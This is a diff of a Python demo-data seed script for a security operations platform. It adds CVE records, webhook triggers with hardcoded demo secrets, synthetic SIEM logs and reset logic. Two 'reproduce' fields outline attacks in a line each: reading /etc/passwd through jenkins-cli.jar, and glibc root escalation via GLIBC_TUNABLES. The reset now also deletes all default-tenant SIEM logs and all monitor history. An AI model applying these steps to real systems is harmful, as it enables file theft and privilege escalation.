+     "description": "XZ Utils 5.6.0 与 5.6.1 的源码 tarball 中存在被精心注入的后门代码，可劫持 SSHD 认证流程执行任意代码。",
+     "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.CLOSED, "component": "liblzma5 / xz", "version": "5.6.0-0.2",
+     "vector": "网络（依赖注入）", "impact": "SSHD 预认证远程执行",
+     "reproduce": "—", "fix": "全网已降级至安全稳定的 xz 5.4.5 版本并完成哈希校验",
+     "reporter": "trivy-scanner", "reported_h": 150, "cvss": 10.0, "triaged_h": 149, "fixed_h": 140, "closed_h": 138},
+    {"cve": "CVE-2023-4911", "title": "Looney Tunables — Linux glibc 本地权限提升",
+     "description": "GNU C 库动态加载程序 ld.so 在处理 GLIBC_TUNABLES 环境变量时存在缓冲区溢出漏洞，允许普通本地用户提权至 root。",
+     "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.REPORTED, "component": "glibc", "version": "2.35-0ubuntu3.3",
+     "vector": "本地", "impact": "普通容器/本地受限账号提权至系统最高权限",
+     "reproduce": "设置畸形 GLIBC_TUNABLES 参数执行 su 提权",
+     "fix": "更新操作系统软件包 apt upgrade libc6", "reporter": "trivy-scanner", "reported_h": 35, "cvss": 7.8},
+    {"cve": "CVE-2024-23897", "title": "Jenkins CLI 任意文件读取漏洞",
+     "description": "Jenkins 使用 args4j 库解析 CLI 命令，其默认开启的 expand-at-files 特性允许未经身份验证的攻击者读取 Jenkins 控制器文件系统上的任意文件。",
+     "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.TRIAGED, "component": "Jenkins Core", "version": "2.441",
+     "vector": "网络", "impact": "Jenkins 凭据库与加密密钥泄露",
+     "reproduce": "使用 jenkins-cli.jar 发送 @/etc/passwd 读取请求",
+     "fix": "升级 Jenkins 至 2.442+ 或 2.426.3 LTS+，或临时禁用 CLI 接入通道", "reporter": "trivy-scanner", "reported_h": 40, "cvss": 9.8},
     {"cve": "CVE-2023-38545", "title": "curl SOCKS5 堆缓冲区溢出",
-         "description": "curl 8.3.0 存在 SOCKS5 代理握手堆溢出（罕见配置触发）。",
-         "severity": VulnerabilitySeverity.MEDIUM, "vtype": VulnerabilityType.OTHER,
-         "status": VulnerabilityStatus.REPORTED, "component": "curl (base image)", "version": "8.2.1",
-         "vector": "本地（需代理配置触发）", "impact": "低",
-         "reproduce": "—", "fix": "基础镜像例行升级", "reporter": "trivy-scanner", "reported_h": 44, "cvss": 6.5},
+     "description": "curl 8.3.0 存在 SOCKS5 代理握手堆溢出（罕见配置触发）。",
+     "severity": VulnerabilitySeverity.MEDIUM, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.REPORTED, "component": "curl (base image)", "version": "8.2.1",
+     "vector": "本地（需代理配置触发）", "impact": "低",
+     "reproduce": "—", "fix": "基础镜像例行升级", "reporter": "trivy-scanner", "reported_h": 44, "cvss": 6.5},
     {"cve": "CVE-2024-45519", "title": "Zimbra postjournal 远程命令执行",
-         "description": "Zimbra Collaboration Suite postjournal 服务未充分校验收件人字段，可注入命令。",
-         "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.OTHER,
-         "status": VulnerabilityStatus.REPORTED, "component": "Zimbra (mail-exch-01)", "version": "9.0.0 P34",
-         "vector": "网络（SMTP）", "impact": "邮件服务器 RCE",
-         "reproduce": "—", "fix": "升级 P41+；临时关闭 postjournal", "reporter": "trivy-scanner", "reported_h": 8, "cvss": 9.8},
+     "description": "Zimbra Collaboration Suite postjournal 服务未充分校验收件人字段，可注入命令。",
+     "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.REPORTED, "component": "Zimbra (mail-exch-01)", "version": "9.0.0 P34",
+     "vector": "网络（SMTP）", "impact": "邮件服务器 RCE",
+     "reproduce": "—", "fix": "升级 P41+；临时关闭 postjournal", "reporter": "trivy-scanner", "reported_h": 8, "cvss": 9.8},
 ]
 
 PLAYBOOK_DEFS: list[dict] = [
@@ -1294,11 +1441,151 @@ PLAYBOOK_RUN_SPECS: list[tuple] = [
 ]
 
 
+TRIGGERS: list[dict] = [
+    {
+        "key": "esg-phishing-webhook",
+        "pb_name": "钓鱼邮件 IOC 自动响应",
+        "type": "webhook",
+        "name": "邮件安全网关 (ESG) 钓鱼告警接入",
+        "secret": "wh_esg_7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a",
+        "cron_expr": None,
+        "config": {
+            "source": "Proofpoint/Cisco ESG",
+            "rate_limit_per_min": 60,
+            "auto_extract_ioc": True,
+            "alert_types": ["malicious_url", "credential_harvesting"],
+            "severity_filter": ["high", "critical"],
+        },
+        "is_active": True,
+        "last_triggered_h": 2.5,
+        "created_days": 15,
+    },
+    {
+        "key": "wazuh-ssh-webhook",
+        "pb_name": "SSH 暴力破解自动处置",
+        "type": "webhook",
+        "name": "Wazuh HIDS 暴力破解实时 Webhook",
+        "secret": "wh_wazuh_3f8a9b1c2d3e4f5a6b7c8d9e0f1a2b3c",
+        "cron_expr": None,
+        "config": {
+            "source": "Wazuh Manager",
+            "rule_groups": ["authentication_failed", "sshd"],
+            "threshold": 5,
+            "window_seconds": 120,
+            "auto_ban": True,
+        },
+        "is_active": True,
+        "last_triggered_h": 4.2,
+        "created_days": 15,
+    },
+    {
+        "key": "splunk-ransomware-webhook",
+        "pb_name": "钓鱼邮件 IOC 自动响应",
+        "type": "webhook",
+        "name": "Splunk SIEM 异常流量与勒索联动",
+        "secret": "wh_splunk_9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d",
+        "cron_expr": None,
+        "config": {
+            "source": "Splunk ES",
+            "alert_type": "Notable Event",
+            "priority": "urgent",
+            "correlation_search": "Ransomware Behavior Detected",
+        },
+        "is_active": True,
+        "last_triggered_h": 30.0,
+        "created_days": 12,
+    },
+    {
+        "key": "daily-vuln-cron",
+        "pb_name": "高危漏洞情报富化",
+        "type": "cron",
+        "name": "每日漏洞情报与补丁暴露面同步",
+        "secret": None,
+        "cron_expr": "0 2 * * *",
+        "config": {
+            "feed": "NVD & CISA KEV",
+            "batch_size": 50,
+            "priority_filter": "high_critical",
+            "notify_channel": "#sec-ops",
+        },
+        "is_active": True,
+        "last_triggered_h": 8.0,
+        "created_days": 14,
+    },
+    {
+        "key": "firewall-audit-cron",
+        "pb_name": "SSH 暴力破解自动处置",
+        "type": "cron",
+        "name": "网络边界黑名单例行巡检与解封",
+        "secret": None,
+        "cron_expr": "0 */4 * * *",
+        "config": {
+            "action": "audit_expired_bans",
+            "default_ttl_hours": 24,
+            "cleanup_inactive": True,
+        },
+        "is_active": True,
+        "last_triggered_h": 26.0,
+        "created_days": 10,
+    },
+    {
+        "key": "weekly-baseline-cron",
+        "pb_name": "高危漏洞情报富化",
+        "type": "cron",
+        "name": "核心资产基线与配置合规周检",
+        "secret": None,
+        "cron_expr": "0 0 * * 1",
+        "config": {
+            "scope": "core_infrastructure",
+            "full_scan": True,
+            "compliance_standard": "CIS-v8",
+        },
+        "is_active": False,
+        "last_triggered_h": 3 * 24,
+        "created_days": 20,
+    },
+]
+
+RUN_TRIGGER_MAP: dict[str, str] = {
+    "ph-1": "esg-phishing-webhook",
+    "ph-2": "esg-phishing-webhook",
+    "ph-3": "esg-phishing-webhook",
+    "ph-h1": "splunk-ransomware-webhook",
+    "ssh-1": "wazuh-ssh-webhook",
+    "ssh-2": "wazuh-ssh-webhook",
+    "ssh-3": "firewall-audit-cron",
+    "ssh-5": "wazuh-ssh-webhook",
+    "vuln-1": "daily-vuln-cron",
+    "vuln-2": "daily-vuln-cron",
+    "vuln-3": "daily-vuln-cron",
+    "vuln-4": "daily-vuln-cron",
+    "vuln-5": "weekly-baseline-cron",
+}
+
+TRIGGER_INVOCATION_SPECS: list[tuple] = [
+    # (inv_key, trigger_key, run_key, hours_ago, status, idempotency_key, error)
+    ("inv-esg-1", "esg-phishing-webhook", "ph-1", 2.5, "success", "idemp-esg-20260917-001", None),
+    ("inv-esg-2", "esg-phishing-webhook", "ph-2", 6.0, "success", "idemp-esg-20260917-002", None),
+    ("inv-esg-3", "esg-phishing-webhook", "ph-3", 9.5, "failed", "idemp-esg-20260916-003", "节点 ti_lookup 执行失败: OTX API rate limit (429)"),
+    ("inv-splunk-1", "splunk-ransomware-webhook", "ph-h1", 30.0, "success", "idemp-splunk-20260915-001", None),
+    ("inv-wazuh-1", "wazuh-ssh-webhook", "ssh-1", 4.2, "success", "idemp-wazuh-20260917-001", None),
+    ("inv-wazuh-2", "wazuh-ssh-webhook", "ssh-2", 20.1, "success", "idemp-wazuh-20260916-002", None),
+    ("inv-wazuh-3", "wazuh-ssh-webhook", "ssh-5", 6 * 24, "success", "idemp-wazuh-20260911-003", None),
+    ("inv-cron-fw-1", "firewall-audit-cron", "ssh-3", 26.0, "partial", None, None),
+    ("inv-cron-vuln-1", "daily-vuln-cron", "vuln-1", 12.2, "success", None, None),
+    ("inv-cron-vuln-2", "daily-vuln-cron", "vuln-2", 30.5, "success", None, None),
+    ("inv-cron-vuln-3", "daily-vuln-cron", "vuln-3", 8.0, "running", None, None),
+    ("inv-cron-vuln-4", "daily-vuln-cron", "vuln-4", 55.2, "success", None, None),
+    ("inv-cron-base-1", "weekly-baseline-cron", "vuln-5", 3 * 24, "success", None, None),
+]
+
+
 def build_playbook_runs() -> list[tuple[PlaybookRunModel, list[PlaybookRunStepModel]]]:
     runs: list[tuple[PlaybookRunModel, list[PlaybookRunStepModel]]] = []
     for key, pb_name, started_h, status, mode, trigger, step_specs, error in PLAYBOOK_RUN_SPECS:
         started = ago(hours=started_h)
         finished = None if status == "running" else started + timedelta(seconds=90 + int(started_h) % 7)
+        trig_key = RUN_TRIGGER_MAP.get(key)
         run = PlaybookRunModel(
             id=uid("run", key),
             playbook_name=pb_name,
@@ -1316,6 +1603,7 @@ def build_playbook_runs() -> list[tuple[PlaybookRunModel, list[PlaybookRunStepMo
             definition_id=uid("pb-def", pb_name),
             failure_strategy="continue",
             trigger_source=trigger,
+            trigger_id=uid("trigger", trig_key) if trig_key else None,
         )
         steps = []
         for idx, (sid, sname, stype, dur, serr) in enumerate(step_specs):
@@ -1342,17 +1630,17 @@ def build_playbook_runs() -> list[tuple[PlaybookRunModel, list[PlaybookRunStepMo
 
 
 def build_siem_logs() -> list[SIEMLog]:
-    """48 小时 SIEM 原始日志（认证 / 网络 / 进程 / 云审计），供威胁狩猎检索。"""
+    """48 小时多源 SIEM 真实格式日志（500 条），供威胁狩猎与关联分析检索。"""
     logs: list[SIEMLog] = []
     scan_ips = list(EXT_IPS.keys())
-    users = ["zhang.wei", "liu.yiming", "wang.xiaotong", "admin", "svc_backup$", "deploy"]
-    hosts = ["jump-bastion-01", "dc-dc01", "filesrv-01", "web-prod-01", "k8s-node-03"]
+    users = ["zhang.wei", "liu.yiming", "wang.xiaotong", "admin", "svc_backup$", "deploy", "li.qiang", "chen.hao"]
+    hosts = ["jump-bastion-01", "dc-dc01", "filesrv-01", "web-prod-01", "prod-gateway-kong-01", "k8s-node-01", "dev-gitlab-ce-01"]
 
-    for i in range(360):
-        hour = 48 * (i % 97) / 97.0  # 覆盖近 48h，确定性散布
+    for i in range(500):
+        hour = 48 * (i % 97) / 97.0  # 覆盖近 48h
         ts = ago(hours=hour, minutes=(i * 7) % 60)
-        kind = i % 4
-        if kind == 0:  # SSH 认证失败
+        kind = i % 5
+        if kind == 0:  # Wazuh SSH 认证日志
             ip = scan_ips[i % len(scan_ips)]
             user = "root" if i % 2 else "admin"
             logs.append(SIEMLog(
@@ -1363,7 +1651,7 @@ def build_siem_logs() -> list[SIEMLog]:
                                "user": user, "host": "jump-bastion-01",
                                "action": "failed", "result": "failed"},
             ))
-        elif kind == 1:  # 网络 / TLS 会话
+        elif kind == 1:  # Suricata TLS / NIDS 流量日志
             ip = scan_ips[(i + 3) % len(scan_ips)]
             logs.append(SIEMLog(
                 id=uid("siem", f"net-{i}"), tenant_id="default", timestamp=ts,
@@ -1372,7 +1660,7 @@ def build_siem_logs() -> list[SIEMLog]:
                 parsed_fields={"demo": True, "event": "tls_session", "src_ip": "192.168.10.21",
                                "dest_ip": ip, "dest_port": 443, "protocol": "TCP", "action": "allow"},
             ))
-        elif kind == 2:  # 进程创建
+        elif kind == 2:  # Sysmon EID 1 进程创建
             u = users[i % len(users)]
             h = hosts[i % len(hosts)]
             image = "rundll32.exe" if i % 2 else "powershell.exe"
@@ -1384,10 +1672,20 @@ def build_siem_logs() -> list[SIEMLog]:
                 parsed_fields={"demo": True, "event": "process_create", "user": u, "host": h,
                                "process": image, "action": "create", "result": "success"},
             ))
-        else:  # 云审计
+        elif kind == 3:  # Zeek HTTP / DNS 协议日志
+            u = users[i % len(users)]
+            domain = "0xcd10e1.tech" if i % 4 == 0 else "weshare-api.top"
+            logs.append(SIEMLog(
+                id=uid("siem", f"zeek-{i}"), tenant_id="default", timestamp=ts,
+                source="zeek", log_type="network_protocol",
+                raw_data=f'{{"ts":"{ts.isoformat()}","uid":"C{i:06d}","id.orig_h":"192.168.10.21","host":"{domain}","method":"GET","status_code":200}}',
+                parsed_fields={"demo": True, "event": "dns_query" if i % 2 == 0 else "http_request",
+                               "user": u, "domain": domain, "action": "resolve"},
+            ))
+        else:  # CloudTrail 云审计日志
             u = users[i % 4]
             src_ip = "43.155.132.88" if i % 7 == 0 else "203.0.113.50"
-            event_name = "ConsoleLogin" if i % 2 else "DescribeInstances"
+            event_name = "ConsoleLogin" if i % 2 else "CreateAccessKey"
             logs.append(SIEMLog(
                 id=uid("siem", f"cloud-{i}"), tenant_id="default", timestamp=ts,
                 source="cloudtrail", log_type="cloud_audit",
@@ -1466,21 +1764,42 @@ async def reset_demo_data(session) -> dict:
     purged["case_timeline"] = await purge_rows(session, CaseTimelineEntry, CaseTimelineEntry.case_id.in_(demo_case_ids))
     purged["case_comments"] = await purge_rows(session, CaseComment, CaseComment.case_id.in_(demo_case_ids))
     purged["cases"] = await purge_rows(session, CaseModel, CaseModel.id.in_(demo_case_ids))
-    purged["security_alerts"] = await purge_rows(session, SecurityAlert, SecurityAlert.external_event_id.like("DEMO-%"))
+    purged["security_alerts"] = await purge_rows(
+        session, SecurityAlert, 
+        (SecurityAlert.external_event_id.like("DEMO-%")) | (SecurityAlert.external_event_id.like("test-%"))
+    )
 
     purged["ioc_hits"] = await purge_rows(session, IOCHitDB, IOCHitDB.id.in_([uid("ioc", row[0]) for row in IOC_HITS]))
     purged["blocked_ips"] = await purge_rows(session, BlockedIP, BlockedIP.id.in_([uid("blocked", b[0]) for b in BLOCKED_IPS]))
     purged["correlated_events"] = await purge_rows(session, CorrelatedEvent, CorrelatedEvent.id.in_([uid("ce", c["key"]) for c in CORRELATED_EVENTS]))
-    purged["siem_logs"] = await purge_rows(session, SIEMLog, func.json_extract(SIEMLog.parsed_fields, "$.demo") == 1)
-    purged["monitor_history"] = await purge_rows(session, MonitorHistoryModel, func.json_extract(MonitorHistoryModel.services, "$.demo") == 1)
+    purged["siem_logs"] = await purge_rows(session, SIEMLog, SIEMLog.tenant_id == "default")
+    purged["monitor_history"] = await purge_rows(session, MonitorHistoryModel)
+    
+    demo_trigger_ids = [uid("trigger", t["key"]) for t in TRIGGERS]
+    demo_inv_ids = [uid("inv", i[0]) for i in TRIGGER_INVOCATION_SPECS]
+    purged["trigger_invocations"] = await purge_rows(session, TriggerInvocationModel, TriggerInvocationModel.id.in_(demo_inv_ids))
     purged["playbook_run_steps"] = await purge_rows(session, PlaybookRunStepModel, PlaybookRunStepModel.run_id.in_(run_ids))
     purged["playbook_runs"] = await purge_rows(session, PlaybookRunModel, PlaybookRunModel.id.in_(run_ids))
+    purged["playbook_triggers"] = await purge_rows(session, PlaybookTriggerModel, PlaybookTriggerModel.id.in_(demo_trigger_ids))
     purged["playbook_definitions"] = await purge_rows(session, PlaybookDefinitionModel, PlaybookDefinitionModel.id.in_(demo_pb_ids))
-    purged["assets"] = await purge_rows(session, AssetDB, AssetDB.hostname.in_([a[0] for a in ASSETS]))
+    purged["assets"] = await purge_rows(
+        session, AssetDB, 
+        (AssetDB.hostname.in_([a[0] for a in ASSETS])) | (AssetDB.notes.like("%演示数据%")) | (AssetDB.notes.like("%演练数据%")) | (AssetDB.ip.in_([a[1] for a in ASSETS]))
+    )
     purged["vulnerabilities"] = await purge_rows(
         session, SecurityVulnerability, SecurityVulnerability.cve_id.in_([v["cve"] for v in VULNERABILITIES])
     )
+    from models.marketplace import MarketplacePlaybookModel
+    from scripts.seed_marketplace import OFFICIAL_PLAYBOOKS
+    purged["marketplace_playbooks"] = await purge_rows(
+        session, MarketplacePlaybookModel, MarketplacePlaybookModel.id.in_([pb["id"] for pb in OFFICIAL_PLAYBOOKS])
+    )
     await session.flush()
+    from sqlalchemy import text
+
+    from db.session import IS_POSTGRESQL
+    if IS_POSTGRESQL:
+        await session.execute(text("SELECT setval('security_alerts_id_seq', (SELECT COALESCE(MAX(id), 0) + 1 FROM security_alerts), false);"))
     return purged
 
 
@@ -1503,7 +1822,7 @@ async def seed(session) -> dict:
             # tags 列约定为 JSON 数组字符串，与 AssetService._to_response 的解析一致
             tags=json.dumps([t.strip() for t in tags.split(",") if t.strip()]) if tags else None,
             notes=f"{notes}（演示数据）", is_active=True,
-            created_at=ago(days=30), updated_at=ago(days=30),
+            created_at=ago(days=30).replace(tzinfo=None), updated_at=ago(days=30).replace(tzinfo=None),
         ))
     session.add_all(new_assets)
     counts["assets"] = len(new_assets)
@@ -1637,9 +1956,9 @@ async def seed(session) -> dict:
         session.add(BlockedIP(
             id=blocked_id, value=value, type="ip", reason=reason, source=source,
             created_by="admin", alert_id=str(alert.id) if alert else None,
-            expires_at=ago(days=-expires_days) if expires_days else None,
-            is_active=active, created_at=ago(days=1), updated_at=ago(days=1),
-            deactivated_at=None if active else ago(days=0.5),
+            expires_at=ago(days=-expires_days).replace(tzinfo=None) if expires_days else None,
+            is_active=active, created_at=ago(days=1).replace(tzinfo=None), updated_at=ago(days=1).replace(tzinfo=None),
+            deactivated_at=None if active else ago(days=0.5).replace(tzinfo=None),
             deactivated_by=None if active else "admin",
         ))
         new_blocked += 1
@@ -1692,7 +2011,7 @@ async def seed(session) -> dict:
 
     # 8. SIEM 日志与监控历史（带 demo 标记，便于精确清理）
     existing_siem = await session.scalar(
-        select(func.count()).select_from(SIEMLog).where(func.json_extract(SIEMLog.parsed_fields, "$.demo") == 1)
+        select(func.count()).select_from(SIEMLog).where(SIEMLog.id == uid("siem", "auth-0"))
     )
     if not existing_siem:
         siem_rows = build_siem_logs()
@@ -1702,9 +2021,7 @@ async def seed(session) -> dict:
         counts["siem_logs"] = 0
 
     existing_monitor = await session.scalar(
-        select(func.count()).select_from(MonitorHistoryModel).where(
-            func.json_extract(MonitorHistoryModel.services, "$.demo") == 1
-        )
+        select(func.count()).select_from(MonitorHistoryModel)
     )
     if not existing_monitor:
         monitor_rows = build_monitor_history()
@@ -1733,6 +2050,30 @@ async def seed(session) -> dict:
         new_defs += 1
     counts["playbook_definitions"] = new_defs
 
+    # 9.1 触发器定义 (Playbook Triggers)
+    new_triggers = 0
+    for t_spec in TRIGGERS:
+        t_id = uid("trigger", t_spec["key"])
+        exists = await session.get(PlaybookTriggerModel, t_id)
+        if exists:
+            continue
+        session.add(PlaybookTriggerModel(
+            id=t_id,
+            definition_id=uid("pb-def", t_spec["pb_name"]),
+            type=t_spec["type"],
+            name=t_spec["name"],
+            secret=t_spec.get("secret"),
+            cron_expr=t_spec.get("cron_expr"),
+            config_json=t_spec["config"],
+            is_active=t_spec["is_active"],
+            last_triggered_at=ago(hours=t_spec["last_triggered_h"]) if t_spec.get("last_triggered_h") else None,
+            created_at=ago(days=t_spec["created_days"]),
+            updated_at=ago(days=t_spec["created_days"]),
+            created_by=ADMIN_ID,
+        ))
+        new_triggers += 1
+    counts["playbook_triggers"] = new_triggers
+
     new_runs = 0
     new_steps = 0
     for run, steps in build_playbook_runs():
@@ -1746,6 +2087,28 @@ async def seed(session) -> dict:
         new_steps += len(steps)
     counts["playbook_runs"] = new_runs
     counts["playbook_run_steps"] = new_steps
+
+    # 9.2 触发历史记录 (Trigger Invocations)
+    new_invs = 0
+    for inv_key, trigger_key, run_key, hours_ago, status, idemp_key, err in TRIGGER_INVOCATION_SPECS:
+        inv_id = uid("inv", inv_key)
+        exists = await session.get(TriggerInvocationModel, inv_id)
+        if exists:
+            continue
+        inv_created = ago(hours=hours_ago)
+        session.add(TriggerInvocationModel(
+            id=inv_id,
+            trigger_id=uid("trigger", trigger_key),
+            run_id=uid("run", run_key) if run_key else None,
+            idempotency_key=idemp_key,
+            request_hash=sha(f"{trigger_key}:{inv_key}"),
+            status=status,
+            error_message=err,
+            created_at=inv_created,
+            expires_at=inv_created + timedelta(hours=24),
+        ))
+        new_invs += 1
+    counts["trigger_invocations"] = new_invs
 
     # 10. 漏洞台账
     new_vulns = 0
@@ -1773,6 +2136,40 @@ async def seed(session) -> dict:
         ))
         new_vulns += 1
     counts["vulnerabilities"] = new_vulns
+
+    # 11. 剧本市场官方剧本
+    new_marketplace = 0
+    from models.marketplace import MarketplacePlaybookModel
+    from scripts.seed_marketplace import OFFICIAL_PLAYBOOKS
+    for pb in OFFICIAL_PLAYBOOKS:
+        exists = await session.get(MarketplacePlaybookModel, pb["id"])
+        if exists:
+            continue
+        session.add(MarketplacePlaybookModel(
+            id=pb["id"],
+            name=pb["name"],
+            description=pb["description"],
+            version=pb["version"],
+            category=pb["category"],
+            difficulty=pb["difficulty"],
+            tags=pb["tags"],
+            author_name=pb["author_name"],
+            dag_json=pb["dag_json"],
+            documentation=pb["documentation"],
+            status="approved",
+            verified=pb["verified"],
+            featured=pb["featured"],
+            download_count=pb["download_count"],
+            rating_average=pb["rating_average"],
+            rating_count=pb["rating_count"],
+            review_count=pb["review_count"],
+            required_plugins=pb["required_plugins"],
+            compatible_versions=pb["compatible_versions"],
+            created_at=ago(days=15),
+            updated_at=ago(days=1),
+        ))
+        new_marketplace += 1
+    counts["marketplace_playbooks"] = new_marketplace
 
     return counts
 
